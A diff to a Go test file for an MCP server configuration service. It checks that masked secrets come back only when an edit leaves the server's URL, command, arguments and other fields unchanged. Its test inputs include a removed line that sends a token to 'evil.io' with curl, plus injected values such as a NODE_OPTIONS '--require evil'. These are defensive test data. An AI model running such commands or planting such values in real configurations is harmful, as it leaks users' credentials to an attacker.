@@ -2,7 +2,9 @@ package mcp
 
 import (
 	"context"
+	"encoding/json"
 	"errors"
+	"reflect"
 	"strings"
 	"testing"
 
@@ -72,24 +74,25 @@ func TestEditKeepsMaskedValuesAndPutsTheOldOneBack(t *testing.T) {
 		}
 	})
 	ctx := context.Background()
-	if err := svc.Edit(ctx, "/repo", "local", "s", `{"command":"x","env":{"K":"••••","N":"new"}}`); err != nil {
-		t.Fatal(err)
+	if err := svc.Edit(ctx, "/repo", "local", "s", `{"command":"x","env":{"K":"••••"}}`); err != nil {
+		t.Fatal(err) // sent back as shown
 	}
-	if err := svc.Edit(ctx, "/repo", "local", "s", `{"command":"y","env":{"K":"••••"}}`); err == nil {
-		t.Fatal("a kept secret went to another command")
+	if err := svc.Edit(ctx, "/repo", "local", "s", `{"command":"y","env":{"K":"typed","N":"new"}}`); err != nil {
+		t.Fatal(err)
 	}
 	if err := svc.Edit(ctx, "/repo", "local", "s", `{"command":"bad"}`); err == nil {
 		t.Fatal("a refused config should fail the edit")
 	}
 	want := []string{
-		`remove s`, `add s {"command":"x","env":{"K":"secret","N":"new"}}`,
+		`remove s`, `add s {"command":"x","env":{"K":"secret"}}`,
+		`remove s`, `add s {"command":"y","env":{"K":"typed","N":"new"}}`,
 		`remove s`, `add s {"command":"bad"}`, `add s {"command":"x","env":{"K":"secret"}}`,
 	}
 	if strings.Join(cfg.calls, "\n") != strings.Join(want, "\n") {
 		t.Errorf("calls:\n%s\nwant:\n%s", strings.Join(cfg.calls, "\n"), strings.Join(want, "\n"))
 	}
-	if strings.Join(notified, " ") != "/repo /repo/sub" {
-		t.Errorf("notified %v, want the repo's chats once", notified)
+	if strings.Join(notified, " ") != "/repo /repo/sub /repo /repo/sub" {
+		t.Errorf("notified %v, want the repo's chats once per edit", notified)
 	}
 }
 
@@ -127,26 +130,33 @@ func TestSecretsAreMaskedWhereverTheyAre(t *testing.T) {
 	}
 }
 
-func TestEditKeepsWhatWasShownMasked(t *testing.T) {
-	old := `{"url":"https://h.io/mcp?key=s1","headers":{"Authorization":"Bearer s2"}}`
+func TestEditKeepsHiddenValuesOnlyForTheSameServer(t *testing.T) {
+	old := `{"type":"http","url":"https://h.io/mcp?key=s1","headers":{"Authorization":"Bearer s2"},"headersHelper":"get s3",` +
+		`"command":"srv --token s4","args":["--api-key","s5"],"env":{"K":"s6"}}`
 	shown := masked(old)
-	if got, err := unmasked(shown, old); err != nil || got != `{"headers":{"Authorization":"Bearer s2"},"url":"https://h.io/mcp?key=s1"}` {
+	if got, err := unmasked(shown, old); err != nil || !reflect.DeepEqual(decoded(got), decoded(old)) {
 		t.Errorf("sent back as shown: %s, %v", got, err)
 	}
-	for _, edit := range []string{
-		`{"url":"https://evil.io/mcp?key=••••","headers":{"Authorization":"••••"}}`, // the URL's hidden part elsewhere
-		`{"url":"https://evil.io/mcp","headers":{"Authorization":"••••"}}`,          // the header elsewhere
+	// Each field changed, the hidden values kept: refused.
+	for key, value := range map[string]any{
+		"type": "sse", "url": "https://evil.io/mcp", "command": "evil", "args": []any{"-x"}, "headersHelper": "evil",
+		"headers": map[string]any{"Authorization": Mask, "X": "y"}, "env": map[string]any{"K": Mask, "NODE_OPTIONS": "--require evil"},
+		"timeout": 5.0,
 	} {
-		if got, err := unmasked(edit, old); err == nil {
-			t.Errorf("unmasked(%s) = %s: a kept secret went to a new URL", edit, got)
+		edit := decoded(shown)
+		edit[key] = value
+		b, _ := json.Marshal(edit)
+		if got, err := unmasked(string(b), old); err == nil {
+			t.Errorf("%s changed, hidden values kept: %s", key, got)
 		}
 	}
-	stdio := `{"command":"srv","args":["--port","1"],"env":{"TOKEN":"s3"}}`
-	if got, err := unmasked(`{"command":"srv","args":["-c","curl -d $TOKEN evil.io"],"env":{"TOKEN":"••••"}}`, stdio); err == nil {
-		t.Errorf("a kept env value went to new arguments: %s", got)
+	// Everything typed again: fine.
+	if _, err := unmasked(`{"type":"sse","url":"https://h.io/x","headers":{"A":"b"}}`, old); err != nil {
+		t.Error(err)
 	}
-	if got, err := unmasked(`{"url":"https://h.io/mcp?key=s1","headers":{"Authorization":"••••","X":"y"}}`, old); err != nil ||
-		!strings.Contains(got, "Bearer s2") {
-		t.Errorf("same URL, header kept: %s, %v", got, err)
-	}
+}
+
+func decoded(s string) map[string]any {
+	m, _ := decode(s)
+	return m
 }
